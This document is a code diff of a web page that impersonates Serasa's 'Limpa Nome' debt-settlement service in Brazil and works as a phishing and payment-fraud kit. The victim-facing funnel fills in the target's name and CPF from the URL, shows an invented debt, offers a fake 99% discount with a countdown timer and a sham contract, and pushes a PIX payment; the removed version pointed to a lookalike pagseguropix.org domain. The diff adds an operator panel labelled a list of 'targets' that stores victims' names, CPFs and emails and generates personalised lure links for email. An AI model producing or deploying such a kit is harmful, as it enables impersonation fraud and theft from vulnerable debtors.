@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Serasa Limpa Nome - Acordo Exclusivo</title>
+    <title>Serasa Limpa Nome - Central de Acordos</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
@@ -12,7 +12,7 @@
         .bg-serasa { background-color: #E10075; }
         .text-serasa { color: #E10075; }
         .border-serasa { border-color: #E10075; }
-        .step-hidden { display: none; }
+        .hidden-view { display: none !important; }
         .loader {
             border: 3px solid #f3f3f3;
             border-top: 3px solid #E10075;
@@ -26,201 +26,324 @@
 </head>
 <body class="bg-white text-slate-900">
 
-    <!-- HEADER OFICIAL -->
-    <header class="bg-serasa text-white py-3 px-4 sticky top-0 z-50 shadow-md">
-        <div class="max-w-7xl mx-auto flex items-center justify-between">
-            <div class="flex items-center gap-4">
-                <i data-lucide="menu" class="cursor-pointer w-6 h-6"></i>
-                <img src="https://www.serasa.com.br/lno/static-webfiles/common/products/limpa-nome-white.svg" alt="Serasa" class="h-7">
-            </div>
-            <div class="flex items-center gap-2 text-sm font-medium bg-white/10 px-4 py-2 rounded-full cursor-pointer hover:bg-white/20 transition-all">
-                <i data-lucide="user" class="w-4 h-4"></i> <span>Entrar</span>
-            </div>
-        </div>
-    </header>
-
-    <!-- TELA DE LOADING -->
-    <div id="loading-screen" class="fixed inset-0 bg-white z-[100] flex flex-col items-center justify-center gap-4">
+    <!-- TELA DE LOADING (Global) -->
+    <div id="loading-screen" class="fixed inset-0 bg-white z-[100] flex flex-col items-center justify-center gap-4 hidden-view">
         <div class="loader"></div>
-        <p class="text-slate-500 font-medium animate-pulse">Consultando banco de dados do Serasa...</p>
+        <p class="text-slate-500 font-medium animate-pulse">Processando requisição segura...</p>
     </div>
 
-    <!-- CONTEÚDO DO FUNIL -->
-    <main class="max-w-7xl mx-auto px-4 py-8 md:py-16">
-        
-        <!-- PASSO 1: LANDING -->
-        <div id="step-landing" class="step-hidden flex flex-col lg:flex-row items-center gap-12">
-            <div class="lg:w-1/2 space-y-6 text-center lg:text-left">
-                <div class="inline-flex items-center gap-2 bg-red-100 text-red-600 px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">
-                    <i data-lucide="alert-triangle" class="w-3 h-3"></i> Notificação Urgente de Crédito
+    <!-- ==========================================
+         VISÃO DO ADMINISTRADOR (PAINEL)
+         ========================================== -->
+    <div id="admin-view" class="hidden-view min-h-screen bg-slate-100">
+        <nav class="bg-slate-900 text-white p-4 flex justify-between items-center shadow-xl">
+            <div class="flex items-center gap-2 font-bold text-xl">
+                <i data-lucide="layout-dashboard" class="text-serasa"></i> Serasa Control Panel
+            </div>
+            <button onclick="window.location.href='?'" class="text-xs bg-slate-700 px-3 py-1 rounded hover:bg-slate-600 transition-all">Ver Site</button>
+        </nav>
+
+        <main class="max-w-6xl mx-auto p-6 space-y-8">
+            <section class="bg-white p-6 rounded-2xl shadow-sm border border-slate-200">
+                <div class="flex items-center gap-2 mb-6 font-bold text-lg text-slate-700">
+                    <i data-lucide="plus" class="text-serasa"></i> Adicionar Novo Lead (Bico)
                 </div>
-                <h1 class="text-4xl lg:text-6xl font-extrabold leading-tight text-slate-900">
-                    Limpe seu nome hoje com <span class="text-serasa">até 99% de desconto</span>
-                </h1>
-                <p class="text-lg text-slate-600">
-                    Olá, <span id="user-name" class="font-bold text-slate-800">Cliente</span>. Foi liberada uma <span class="underline decoration-serasa font-bold">oportunidade única de quitação</span> para o CPF <span id="user-cpf" class="font-bold text-slate-800">000.000.000-00</span>.
-                </p>
-                <div class="bg-slate-50 p-6 rounded-2xl border-2 border-slate-200 space-y-4 shadow-sm max-w-xl mx-auto lg:mx-0">
-                    <div class="flex items-center gap-3 text-green-600 font-bold">
-                        <i data-lucide="shield-check" class="w-5 h-5"></i> <span>SISTEMA DE QUITAÇÃO ATIVO</span>
+                <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+                    <input type="text" id="lead-name" placeholder="Nome Completo" class="p-3 border rounded-xl outline-none focus:ring-2 ring-serasa">
+                    <input type="text" id="lead-cpf" placeholder="CPF (000.000.000-00)" class="p-3 border rounded-xl outline-none focus:ring-2 ring-serasa">
+                    <input type="email" id="lead-email" placeholder="E-mail" class="p-3 border rounded-xl outline-none focus:ring-2 ring-serasa">
+                    <button onclick="addLead()" class="bg-serasa text-white font-bold py-3 rounded-xl hover:bg-[#c20066] transition-all flex items-center justify-center gap-2">
+                        <i data-lucide="plus" size="20"></i> Adicionar
+                    </button>
+                </div>
+            </section>
+
+            <section class="bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden">
+                <div class="p-6 border-b flex justify-between items-center">
+                    <div class="flex items-center gap-2 font-bold text-lg text-slate-700">
+                        <i data-lucide="users" class="text-serasa"></i> Lista de Alvos
                     </div>
-                    <p class="text-sm text-slate-500 leading-relaxed">
-                        Atenção: Esta oferta é exclusiva para o seu perfil e expira automaticamente. Ao quitar, seu nome é limpo e seu <strong class="font-bold">Score é impulsionado</strong> para liberação de crédito.
+                    <span id="lead-count" class="text-xs font-medium bg-slate-100 px-3 py-1 rounded-full text-slate-500">Total: 0</span>
+                </div>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left text-sm">
+                        <thead class="bg-slate-50 text-slate-500 uppercase text-xs font-bold">
+                            <tr>
+                                <th class="p-4">Nome</th>
+                                <th class="p-4">CPF</th>
+                                <th class="p-4">E-mail</th>
+                                <th class="p-4">Link de Disparo</th>
+                                <th class="p-4">Ações</th>
+                            </tr>
+                        </thead>
+                        <tbody id="leads-table" class="divide-y">
+                            <!-- Leads inseridos via JS -->
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+            <div class="p-4 bg-blue-50 border border-blue-100 rounded-xl text-blue-700 text-sm flex gap-3">
+                <i data-lucide="mail" class="shrink-0"></i>
+                <p><strong>Sincronização:</strong> Copie o link gerado e envie por e-mail. O site lerá automaticamente os dados do cliente.</p>
+            </div>
+        </main>
+    </div>
+
+    <!-- ==========================================
+         VISÃO DO CLIENTE (FUNIL)
+         ========================================== -->
+    <div id="client-view" class="hidden-view min-h-screen bg-white">
+        <header class="bg-serasa text-white py-3 px-4 sticky top-0 z-50 shadow-md">
+            <div class="max-w-7xl mx-auto flex items-center justify-between">
+                <div class="flex items-center gap-4">
+                    <i data-lucide="menu" class="cursor-pointer w-6 h-6"></i>
+                    <img src="https://www.serasa.com.br/lno/static-webfiles/common/products/limpa-nome-white.svg" alt="Serasa" class="h-7">
+                </div>
+                <div class="flex items-center gap-2 text-sm font-medium bg-white/10 px-4 py-2 rounded-full cursor-pointer hover:bg-white/20 transition-all">
+                    <i data-lucide="user" class="w-4 h-4"></i> <span>Entrar</span>
+                </div>
+            </div>
+        </header>
+
+        <main class="max-w-7xl mx-auto px-4 py-8 md:py-16">
+            <!-- Passo 1: Landing -->
+            <div id="step-landing" class="step-hidden flex flex-col lg:flex-row items-center gap-12">
+                <div class="lg:w-1/2 space-y-6 text-center lg:text-left">
+                    <div class="inline-flex items-center gap-2 bg-red-100 text-red-600 px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">
+                        <i data-lucide="alert-triangle" class="w-3 h-3"></i> Notificação Urgente de Crédito
+                    </div>
+                    <h1 class="text-4xl lg:text-6xl font-extrabold leading-tight text-slate-900">
+                        Limpe seu nome hoje com <span class="text-serasa">até 99% de desconto</span>
+                    </h1>
+                    <p class="text-lg text-slate-600">
+                        Olá, <span id="user-name" class="font-bold text-slate-800">Cliente</span>. Foi liberada uma <span class="underline decoration-serasa font-bold">oportunidade única de quitação</span> para o CPF <span id="user-cpf" class="font-bold text-slate-800">000.000.000-00</span>.
                     </p>
-                    <button onclick="nextStep('offer')" class="w-full bg-serasa text-white font-black py-4 rounded-xl hover:bg-[#c20066] transition-all flex items-center justify-center gap-2 text-xl shadow-xl uppercase tracking-tight">
-                        Ver Valor do Desconto <i data-lucide="arrow-right" class="w-6 h-6"></i>
-                    </button>
+                    <div class="bg-slate-50 p-6 rounded-2xl border-2 border-slate-200 space-y-4 shadow-sm max-w-xl mx-auto lg:mx-0">
+                        <div class="flex items-center gap-3 text-green-600 font-bold">
+                            <i data-lucide="shield-check" class="w-5 h-5"></i> <span>SISTEMA DE QUITAÇÃO ATIVO</span>
+                        </div>
+                        <p class="text-sm text-slate-500 leading-relaxed">
+                            Atenção: Esta oferta é exclusiva para o seu perfil e expira automaticamente. Ao quitar, seu nome é limpo e seu <strong>Score é impulsionado</strong>.
+                        </p>
+                        <button onclick="nextStep('offer')" class="w-full bg-serasa text-white font-black py-4 rounded-xl hover:bg-[#c20066] transition-all flex items-center justify-center gap-2 text-xl shadow-xl uppercase tracking-tight">
+                            Ver Valor do Desconto <i data-lucide="arrow-right" class="w-6 h-6"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="lg:w-1/2 mt-12 lg:mt-0">
+                    <img src="https://cdn.builder.io/api/v1/image/assets%2Fb212bb18f00a40869a6cd42f77cbeefc%2F9f794558b8a24871931e873d2bc607a6?quality=70" class="w-full max-w-md mx-auto rounded-3xl shadow-2xl border-8 border-white" alt="Oferta">
                 </div>
             </div>
-            <div class="lg:w-1/2 mt-12 lg:mt-0">
-                <img src="https://cdn.builder.io/api/v1/image/assets%2Fb212bb18f00a40869a6cd42f77cbeefc%2F9f794558b8a24871931e873d2bc607a6?quality=70" class="w-full max-w-md mx-auto rounded-3xl shadow-2xl border-8 border-white" alt="Oferta">
-            </div>
-        </div>
 
-        <!-- PASSO 2: OFERTA -->
-        <div id="step-offer" class="step-hidden max-w-3xl mx-auto">
-            <div class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-200">
-                <div class="bg-serasa p-6 text-white text-center relative">
-                    <div class="absolute top-4 right-4 flex items-center gap-2 bg-black/20 px-3 py-1 rounded-full text-xs font-mono">
-                        <i data-lucide="clock" class="w-3 h-3"></i> <span id="timer">14:59</span>
+            <!-- Passo 2: Oferta -->
+            <div id="step-offer" class="step-hidden max-w-3xl mx-auto">
+                <div class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-200">
+                    <div class="bg-serasa p-6 text-white text-center relative">
+                        <div class="absolute top-4 right-4 flex items-center gap-2 bg-black/20 px-3 py-1 rounded-full text-xs font-mono">
+                            <i data-lucide="clock" class="w-3 h-3"></i> <span id="timer">14:59</span>
+                        </div>
+                        <h2 class="text-3xl font-black">OFERTA DE QUITAÇÃO ABSOLUTA</h2>
+                        <p class="opacity-90">Aproveite o desconto de final de ano antes que expire</p>
                     </div>
-                    <h2 class="text-3xl font-black">OFERTA DE QUITAÇÃO ABSOLUTA</h2>
-                    <p class="opacity-90">Aproveite o desconto de final de ano antes que expire</p>
-                </div>
-                <div class="p-8 space-y-8">
-                    <div class="flex flex-col md:flex-row justify-between items-center p-6 bg-slate-50 rounded-2xl border-2 border-dashed border-slate-300 gap-4">
-                        <div class="text-center md:text-left">
-                            <p class="text-xs text-slate-500 uppercase font-bold">Dívida Total Acumulada</p>
-                            <p id="debt-value" class="text-2xl text-slate-400 line-through font-medium">R$ 0,00</p>
+                    <div class="p-8 space-y-8">
+                        <div class="flex flex-col md:flex-row justify-between items-center p-6 bg-slate-50 rounded-2xl border-2 border-dashed border-slate-300 gap-4">
+                            <div class="text-center md:text-left">
+                                <p class="text-xs text-slate-500 uppercase font-bold">Dívida Total Acumulada</p>
+                                <p id="debt-value" class="text-2xl text-slate-400 line-through font-medium">R$ 0,00</p>
+                            </div>
+                            <div class="h-px w-full md:h-12 md:w-px bg-slate-200"></div>
+                            <div class="text-center md:text-right">
+                                <p class="text-xs text-serasa uppercase font-bold">Valor para Quitar Agora</p>
+                                <p class="text-4xl font-black text-serasa">R$ 142,15</p>
+                            </div>
                         </div>
-                        <div class="h-px w-full md:h-12 md:w-px bg-slate-200"></div>
-                        <div class="text-center md:text-right">
-                            <p class="text-xs text-serasa uppercase font-bold">Valor para Quitar Agora</p>
-                            <p class="text-4xl font-black text-serasa">R$ 142,15</p>
+                        <div class="grid md:grid-cols-2 gap-4">
+                            <div class="flex items-start gap-3 p-4 bg-green-50 rounded-xl border border-green-100">
+                                <i data-lucide="check-circle-2" class="text-green-500 shrink-0 w-5 h-5"></i>
+                                <p class="text-sm text-slate-700"><strong>Nome Limpo:</strong> Retirada imediata de todas as restrições.</p>
+                            </div>
+                            <div class="flex items-start gap-3 p-4 bg-green-50 rounded-xl border border-green-100">
+                                <i data-lucide="check-circle-2" class="text-green-500 shrink-0 w-5 h-5"></i>
+                                <p class="text-sm text-slate-700"><strong>Crédito:</strong> Liberação de novos limites bancários.</p>
+                            </div>
                         </div>
+                        <button onclick="nextStep('contract')" class="w-full bg-serasa text-white font-black py-5 rounded-xl hover:bg-[#c20066] transition-all text-xl shadow-lg uppercase tracking-tight">
+                            Quitar Dívida Agora
+                        </button>
                     </div>
-                    <div class="grid md:grid-cols-2 gap-4">
-                        <div class="flex items-start gap-3 p-4 bg-green-50 rounded-xl border border-green-100">
-                            <i data-lucide="check-circle-2" class="text-green-500 shrink-0 w-5 h-5"></i>
-                            <p class="text-sm text-slate-700"><strong class="font-bold">Nome Limpo:</strong> Retirada imediata de todas as restrições do CPF.</p>
-                        </div>
-                        <div class="flex items-start gap-3 p-4 bg-green-50 rounded-xl border border-green-100">
-                            <i data-lucide="check-circle-2" class="text-green-500 shrink-0 w-5 h-5"></i>
-                            <p class="text-sm text-slate-700"><strong class="font-bold">Crédito:</strong> Liberação de novos limites bancários após baixa.</p>
-                        </div>
-                    </div>
-                    <button onclick="nextStep('contract')" class="w-full bg-serasa text-white font-black py-5 rounded-xl hover:bg-[#c20066] transition-all text-xl shadow-lg uppercase tracking-tight">
-                        Quitar Dívida Agora
-                    </button>
                 </div>
             </div>
-        </div>
 
-        <!-- PASSO 3: CONTRATO -->
-        <div id="step-contract" class="step-hidden max-w-3xl mx-auto">
-            <div class="bg-white rounded-3xl shadow-2xl p-8 border border-slate-200">
-                <div class="flex items-center gap-3 mb-6 text-slate-800">
-                    <i data-lucide="file-text" class="text-serasa w-6 h-6"></i> <h2 class="text-2xl font-bold">Termo de Acordo Extrajudicial</h2>
-                </div>
-                <div class="bg-slate-50 p-6 rounded-xl text-xs text-slate-600 leading-relaxed h-64 overflow-y-scroll border border-slate-200 mb-8 font-mono">
-                    <p class="mb-4 font-bold text-slate-800">CLÁUSULA 1ª - DA REGULARIZAÇÃO</p>
-                    <p class="mb-4">O Sr(a). <span class="contract-name font-bold"></span>, CPF <span class="contract-cpf font-bold"></span>, declara aceitar a proposta de quitação total de seus débitos mediante o pagamento único de R$ 142,15.</p>
-                    <p class="mb-4 font-bold text-slate-800">CLÁUSULA 2ª - DA BAIXA DE RESTRIÇÕES</p>
-                    <p class="mb-4">A Serasa e as instituições credoras comprometem-se a efetuar a baixa de todas as anotações negativas no prazo de até 5 dias úteis após a compensação do pagamento.</p>
-                    <p class="mb-4 font-bold text-slate-800">CLÁUSULA 3ª - DO CRÉDITO</p>
-                    <p>A quitação total do débito impactará positivamente a pontuação de crédito (Score), permitindo a reabilitação financeira do cliente.</p>
-                </div>
-                <div class="space-y-6">
-                    <div class="flex items-center gap-3 p-4 bg-blue-50 rounded-xl border border-blue-100 text-blue-700 text-sm">
-                        <i data-lucide="lock" class="w-4 h-4"></i> <span>Assinatura Digital Criptografada via SSL</span>
+            <!-- Passo 3: Contrato -->
+            <div id="step-contract" class="step-hidden max-w-3xl mx-auto">
+                <div class="bg-white rounded-3xl shadow-2xl p-8 border border-slate-200">
+                    <div class="flex items-center gap-3 mb-6 text-slate-800">
+                        <i data-lucide="file-text" class="text-serasa w-6 h-6"></i> <h2 class="text-2xl font-bold">Termo de Acordo Extrajudicial</h2>
                     </div>
-                    <button onclick="nextStep('checkout')" class="w-full bg-serasa text-white font-black py-4 rounded-xl hover:bg-[#c20066] transition-all text-lg shadow-lg uppercase">
-                        Assinar e Gerar Pagamento
-                    </button>
+                    <div class="bg-slate-50 p-6 rounded-xl text-xs text-slate-600 leading-relaxed h-64 overflow-y-scroll border border-slate-200 mb-8 font-mono">
+                        <p class="mb-4 font-bold text-slate-800">CLÁUSULA 1ª - DA REGULARIZAÇÃO</p>
+                        <p class="mb-4">O Sr(a). <span class="contract-name font-bold"></span>, CPF <span class="contract-cpf font-bold"></span>, declara aceitar a proposta de quitação total de seus débitos mediante o pagamento único de R$ 142,15.</p>
+                        <p class="mb-4 font-bold text-slate-800">CLÁUSULA 2ª - DA BAIXA DE RESTRIÇÕES</p>
+                        <p class="mb-4">A Serasa e as instituições credoras comprometem-se a efetuar a baixa de todas as anotações negativas no prazo de até 5 dias úteis após a compensação do pagamento.</p>
+                        <p class="mb-4 font-bold text-slate-800">CLÁUSULA 3ª - DO CRÉDITO</p>
+                        <p>A quitação total do débito impactará positivamente a pontuação de crédito (Score), permitindo a reabilitação financeira do cliente.</p>
+                    </div>
+                    <div class="space-y-6">
+                        <div class="flex items-center gap-3 p-4 bg-blue-50 rounded-xl border border-blue-100 text-blue-700 text-sm">
+                            <i data-lucide="lock" class="w-4 h-4"></i> <span>Assinatura Digital Criptografada via SSL</span>
+                        </div>
+                        <button onclick="nextStep('checkout')" class="w-full bg-serasa text-white font-black py-4 rounded-xl hover:bg-[#c20066] transition-all text-lg shadow-lg uppercase">
+                            Assinar e Gerar Pagamento
+                        </button>
+                    </div>
                 </div>
             </div>
-        </div>
 
-        <!-- PASSO 4: CHECKOUT -->
-        <div id="step-checkout" class="step-hidden max-w-xl mx-auto">
-            <div class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-200 p-8 text-center space-y-6">
-                <div class="inline-flex p-3 bg-green-100 text-green-600 rounded-full">
-                    <i data-lucide="check-circle" class="w-8 h-8"></i>
-                </div>
-                <h2 class="text-3xl font-black text-slate-800">Acordo Confirmado!</h2>
-                <p class="text-slate-500">Para liberar seu crédito agora, finalize o pagamento via PIX.</p>
-                <div onclick="window.location.href='https://pagseguropix.org/c/regulair'" class="group flex items-center justify-between p-6 border-2 border-slate-200 rounded-2xl cursor-pointer hover:border-serasa transition-all bg-white shadow-sm">
-                    <div class="flex items-center gap-4">
-                        <div class="p-3 bg-slate-100 rounded-lg group-hover:bg-pink-50 transition-colors">
-                            <i data-lucide="credit-card" class="text-slate-600 group-hover:text-serasa"></i>
-                        </div>
-                        <div class="text-left">
-                            <p class="font-black text-slate-800 text-lg">PIX (Aprovação Instantânea)</p>
-                            <p class="text-sm text-slate-500">Valor: R$ 142,15</p>
-                        </div>
+            <!-- Passo 4: Checkout -->
+            <div id="step-checkout" class="step-hidden max-w-xl mx-auto">
+                <div class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-200 p-8 text-center space-y-6">
+                    <div class="inline-flex p-3 bg-green-100 text-green-600 rounded-full">
+                        <i data-lucide="check-circle" class="w-8 h-8"></i>
                     </div>
-                    <i data-lucide="arrow-right" class="text-slate-300 group-hover:text-serasa"></i>
-                </div>
-                <div class="p-4 bg-red-50 rounded-xl border border-red-100 flex gap-3 text-xs text-red-700">
-                    <i data-lucide="alert-circle" class="shrink-0 w-5 h-5"></i>
-                    <span class="font-medium">URGENTE: O código PIX expira em 30 minutos. Se não for pago, a oferta de 99% de desconto será cancelada permanentemente.</span>
+                    <h2 class="text-3xl font-black text-slate-800">Acordo Confirmado!</h2>
+                    <p class="text-slate-500">Para liberar seu crédito agora, finalize o pagamento via PIX.</p>
+                    <div onclick="window.location.href=''" class="group flex items-center justify-between p-6 border-2 border-slate-200 rounded-2xl cursor-pointer hover:border-serasa transition-all bg-white shadow-sm">
+                        <div class="flex items-center gap-4">
+                            <div class="p-3 bg-slate-100 rounded-lg group-hover:bg-pink-50 transition-colors">
+                                <i data-lucide="credit-card" class="text-slate-600 group-hover:text-serasa"></i>
+                            </div>
+                            <div class="text-left">
+                                <p class="font-black text-slate-800 text-lg">PIX (Aprovação Instantânea)</p>
+                                <p class="text-sm text-slate-500">Valor: R$ 142,15</p>
+                            </div>
+                        </div>
+                        <i data-lucide="arrow-right" class="text-slate-300 group-hover:text-serasa"></i>
+                    </div>
+                    <div class="p-4 bg-red-50 rounded-xl border border-red-100 flex gap-3 text-xs text-red-700">
+                        <i data-lucide="alert-circle" class="shrink-0 w-5 h-5"></i>
+                        <span class="font-medium">URGENTE: O código PIX expira em 30 minutos. Se não for pago, a oferta será cancelada permanentemente.</span>
+                    </div>
                 </div>
             </div>
-        </div>
-
-    </main>
+        </main>
+    </div>
 
     <script>
-        // Inicializa ícones
         lucide.createIcons();
 
-        // Captura de dados da URL
+        // CONFIGURAÇÃO DE URL
+        const currentUrl = window.location.origin + window.location.pathname;
         const params = new URLSearchParams(window.location.search);
-        const name = params.get('nome') || 'Cliente';
-        const cpf = params.get('cpf') || '000.000.000-00';
+        const name = params.get('nome');
+        const cpf = params.get('cpf');
 
-        document.getElementById('user-name').innerText = name;
-        document.getElementById('user-cpf').innerText = cpf;
-        document.querySelectorAll('.contract-name').forEach(el => el.innerText = name);
-        document.querySelectorAll('.contract-cpf').forEach(el => el.innerText = cpf);
+        // LÓGICA DE VISUALIZAÇÃO (Admin vs Cliente)
+        if (name || cpf) {
+            document.getElementById('client-view').classList.remove('hidden-view');
+            setupClientView(name || 'Cliente', cpf || '000.000.000-00');
+        } else {
+            document.getElementById('admin-view').classList.remove('hidden-view');
+            loadLeads();
+        }
 
-        // Valor de dívida aleatório
-        const randomDebt = (Math.random() * (15000 - 4000) + 4000).toLocaleString('pt-BR', {
-            style: 'currency',
-            currency: 'BRL',
-        });
-        document.getElementById('debt-value').innerText = randomDebt;
+        // FUNÇÕES DO CLIENTE
+        function setupClientView(userName, userCpf) {
+            document.getElementById('user-name').innerText = userName;
+            document.getElementById('user-cpf').innerText = userCpf;
+            document.querySelectorAll('.contract-name').forEach(el => el.innerText = userName);
+            document.querySelectorAll('.contract-cpf').forEach(el => el.innerText = userCpf);
+            
+            const randomDebt = (Math.random() * (15000 - 4000) + 4000).toLocaleString('pt-BR', {
+                style: 'currency', currency: 'BRL'
+            });
+            document.getElementById('debt-value').innerText = randomDebt;
+            
+            document.getElementById('step-landing').classList.remove('step-hidden');
+            startTimer();
+        }
 
-        // Timer de urgência
-        let timeLeft = 899;
-        const timerElement = document.getElementById('timer');
-        setInterval(() => {
-            if (timeLeft <= 0) return;
-            timeLeft--;
-            const mins = Math.floor(timeLeft / 60);
-            const secs = timeLeft % 60;
-            timerElement.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
-        }, 1000);
-
-        // Navegação entre passos
         function nextStep(stepId) {
-            document.getElementById('loading-screen').classList.remove('step-hidden');
+            document.getElementById('loading-screen').classList.remove('hidden-view');
             setTimeout(() => {
-                document.querySelectorAll('main > div').forEach(div => div.classList.add('step-hidden'));
+                document.querySelectorAll('.step-hidden').forEach(div => {
+                    if(div.id.startsWith('step-')) div.classList.add('step-hidden');
+                });
                 document.getElementById('step-' + stepId).classList.remove('step-hidden');
-                document.getElementById('loading-screen').classList.add('step-hidden');
+                document.getElementById('loading-screen').classList.add('hidden-view');
                 window.scrollTo(0, 0);
                 lucide.createIcons();
             }, 800);
         }
 
-        // Remove loading inicial
-        window.onload = () => {
-            setTimeout(() => {
-                document.getElementById('loading-screen').classList.add('step-hidden');
-                document.getElementById('step-landing').classList.remove('step-hidden');
-            }, 1500);
-        };
+        function startTimer() {
+            let timeLeft = 899;
+            const timerElement = document.getElementById('timer');
+            setInterval(() => {
+                if (timeLeft <= 0) return;
+                timeLeft--;
+                const mins = Math.floor(timeLeft / 60);
+                const secs = timeLeft % 60;
+                timerElement.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+            }, 1000);
+        }
+
+        // FUNÇÕES DO ADMIN
+        function addLead() {
+            const name = document.getElementById('lead-name').value;
+            const cpf = document.getElementById('lead-cpf').value;
+            const email = document.getElementById('lead-email').value;
+
+            if(!name || !cpf) return alert("Preencha Nome e CPF");
+
+            const leads = JSON.parse(localStorage.getItem('serasa_leads') || '[]');
+            leads.push({ name, cpf, email });
+            localStorage.setItem('serasa_leads', JSON.stringify(leads));
+            
+            document.getElementById('lead-name').value = '';
+            document.getElementById('lead-cpf').value = '';
+            document.getElementById('lead-email').value = '';
+            
+            loadLeads();
+        }
+
+        function loadLeads() {
+            const leads = JSON.parse(localStorage.getItem('serasa_leads') || '[]');
+            const table = document.getElementById('leads-table');
+            document.getElementById('lead-count').innerText = `Total: ${leads.length}`;
+            table.innerHTML = '';
+
+            leads.forEach((lead, index) => {
+                const link = `${currentUrl}?nome=${encodeURIComponent(lead.name)}&cpf=${encodeURIComponent(lead.cpf)}`;
+                table.innerHTML += `
+                    <tr class="hover:bg-slate-50 transition-colors">
+                        <td class="p-4 font-medium">${lead.name}</td>
+                        <td class="p-4">${lead.cpf}</td>
+                        <td class="p-4">${lead.email}</td>
+                        <td class="p-4">
+                            <div class="flex items-center gap-2">
+                                <input readonly value="${link}" class="text-xs p-1 bg-slate-100 border rounded w-40">
+                                <button onclick="navigator.clipboard.writeText('${link}')" class="p-1 hover:text-serasa transition-colors">
+                                    <i data-lucide="external-link" size="14"></i>
+                                </button>
+                            </div>
+                        </td>
+                        <td class="p-4">
+                            <button onclick="removeLead(${index})" class="text-red-500 hover:text-red-700 transition-colors">
+                                <i data-lucide="trash-2" size="18"></i>
+                            </button>
+                        </td>
+                    </tr>
+                `;
+            });
+            lucide.createIcons();
+        }
+
+        function removeLead(index) {
+            const leads = JSON.parse(localStorage.getItem('serasa_leads') || '[]');
+            leads.splice(index, 1);
+            localStorage.setItem('serasa_leads', JSON.stringify(leads));
+            loadLeads();
+        }
     </script>
 </body>
 </html>
